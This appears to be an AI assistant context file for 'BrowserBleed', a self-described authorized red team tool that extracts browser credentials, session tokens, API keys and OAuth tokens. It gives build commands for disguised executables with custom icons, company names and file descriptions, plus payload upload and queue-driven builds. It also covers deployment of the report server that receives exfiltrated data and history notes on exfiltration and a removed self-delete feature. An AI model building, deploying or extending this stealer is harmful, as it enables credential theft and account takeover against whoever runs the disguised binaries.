# BrowserBleed — Claude Context

Authorized red team credential extraction tool. Windows exe + Go report server.

## Project layout

```
BrowserBleed.py          # main extractor (PyInstaller onefile source)
build_windows.ps1        # builds payloads — run from repo root
build_agent.py           # local Windows agent: polls /builds/claim and runs build_windows.ps1
icons/                   # .ico / .png files for exe disguising
payloads/                # built exes (gitignored)
server/                  # Go report server
  cmd/server/            # main entrypoint + embedded web/ templates
  internal/handler/      # HTTP handlers
deploy/
  config                 # DOMAIN, BB_API_KEY, ENCRYPTION_KEY, REGION, etc.
  .provision-state       # INSTANCE_ID, PUBLIC_IP (generated by provision script)
  deploy-binary.sh       # deploy script — see below
  bb-reports.pem         # EC2 keypair (legacy, no longer needed for deploy)
```

## Building payloads

### Option A — Local build

All three build scripts read `DOMAIN` and `BB_API_KEY` from `deploy/config` automatically.

**Windows** (PowerShell, from repo root):
```powershell
.\build_windows.ps1 -Preset chrome
.\build_windows.ps1 -Preset chrome -Upload    # build + upload to payload server
```
Params: `-Preset`, `-ExeName`, `-Company`, `-FileDesc`, `-IconFile`, `-Upload`

**macOS** (run on a Mac):
```bash
./build_mac.sh --preset chrome
./build_mac.sh --preset chrome --upload       # build + upload to payload server
```

**Linux** (run on Linux, requires sudo):
```bash
sudo ./build_linux.sh --preset chrome
sudo ./build_linux.sh --preset chrome --upload  # build + upload to payload server
```

All scripts accept `--upload` / `-Upload` to POST the built binary to `$EXFIL_URL/payloads` after building. The payload server returns HTTP 303 on success (post-redirect-get pattern) — scripts treat any 2xx/3xx as success.

The `/payloads` page has a command generator with Windows/macOS/Linux tabs and an "Upload after build" checkbox.

Or run the Python agent to poll the server queue and build automatically:
```
python build_agent.py
```

### Option B — Manual upload

Upload any pre-built binary via `/payloads` → Manual Upload section.

## Deploying the server

**No PEM file needed.** Uses EC2 Instance Connect (temporary SSH key via AWS API).

```bash
# 1. Ensure AWS SSO is active
aws sso login          # only needed if session expired; check with: aws sts get-caller-identity

# 2. Deploy
bash deploy/deploy-binary.sh
```

The script: cross-compiles the Go binary for linux/amd64, pushes a 60-second temp SSH key
via `aws ec2-instance-connect send-ssh-public-key`, SCPs the binary, then restarts `bb-reports.service`.

### EC2 instance details
- Instance ID: `i-XXXXXXXXXXXXXXXXX`
- Public IP: `x.x.x.x`
- Domain: `reports.example.com`
- OS user: `ec2-user`
- Service: `bb-reports.service` (systemd), binary at `/opt/bb-reports/server`
- IAM profile: `bb-reports-ec2` (AmazonSSMManagedInstanceCore + S3ReadOnly)

### If SSO session is expired
```
aws sso login
```
Then re-run the deploy script. No other credentials needed.

## Known issues / history

- **Self-delete removed**: `subprocess.Popen` in a PyInstaller frozen elevated exe blocks
  indefinitely, preventing the exfil section from running. Self-delete was removed entirely.
  The exe now runs, exfils, and exits cleanly. Do not re-add without solving this root cause.

- **Encoding**: Always use `-Encoding utf8` when calling `Get-Content` on the Python source
  in build_windows.ps1. Without it, PowerShell reads as CP1252 and corrupts UTF-8 box-drawing
  chars in string literals before PyInstaller compiles them.

- **Hit count variation**: Normal — tied to how many browser sessions are active at run time.
  Session ID hits dominate the count (can be 400+ or as low as 10 depending on open tabs).
  Core credentials (API keys, OAuth tokens) are stable across runs.
